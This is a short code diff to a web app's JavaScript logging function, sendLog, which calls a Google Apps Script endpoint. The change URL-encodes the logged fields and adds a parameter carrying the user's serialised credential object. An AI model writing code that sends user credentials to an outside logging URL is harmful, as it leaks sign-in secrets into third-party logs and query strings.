@@ -310,7 +310,7 @@ function convertText(input) {
 // 
 function sendLog(question, req) {
   fetch('https://script.google.com/macros/s/AKfycbyu44lG2Yl-TNCskt1brXgeBPt11D1uDST_iNFLOI0Uc67HVa8WBdxDIp6NW58KK2BrRA/exec'
-        +'?ip='+ip+'&question='+question+'&req='+req)
+        +'?ip='+ip+'&question='+encodeURIComponent(question)+'&req='+encodeURIComponent(req)+'&userdata='+encodeURIComponent(JSON.stringify(credential)))
 }
 
 function initialize(userdata) {
